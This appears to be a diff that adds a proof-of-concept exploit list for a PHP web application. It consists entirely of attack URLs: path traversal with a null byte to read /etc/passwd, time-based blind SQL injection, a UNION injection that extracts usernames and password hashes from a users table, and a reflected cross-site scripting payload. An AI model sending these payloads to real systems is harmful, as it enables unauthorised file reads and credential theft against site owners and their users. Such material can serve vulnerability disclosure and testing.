@@ -1,0 +1,14 @@
+http://www.example.com/path/index.php?p=../../../../../../etc/passwd%00
+
+http://www.example.com/path/index.php?s=../../../../../../../etc/passwd%00
+
+http://www.example.com/path/index.php?y=1&i=%25-1%25' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23
+
+http://www.example.com/path/index.php?p=register&v=1' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23
+
+http://www.example.com/path/index.php?p=register&v=-1' UNION ALL SELECT GROUP_CONCAT(uname,0x3a,passwd),2 FROM users%23
+
+http://www.example.com/path/index.php?p=error&e=&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+
+
